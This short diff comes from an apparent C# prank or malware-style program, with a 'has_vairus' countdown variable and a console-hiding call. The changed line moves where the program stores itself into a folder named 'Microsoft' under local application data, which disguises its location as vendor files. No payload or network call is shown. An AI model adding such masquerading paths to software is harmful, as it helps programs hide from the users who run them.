@@ -18,7 +18,7 @@ namespace computar
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         static int countdown_yur_compiutar_has_vairus = 0;
         static readonly Timer timer1 = new Timer();
-        static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), AppDomain.CurrentDomain.FriendlyName);
+        static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft", AppDomain.CurrentDomain.FriendlyName);
         static void Main()
         {
             var handle = GetConsoleWindow();
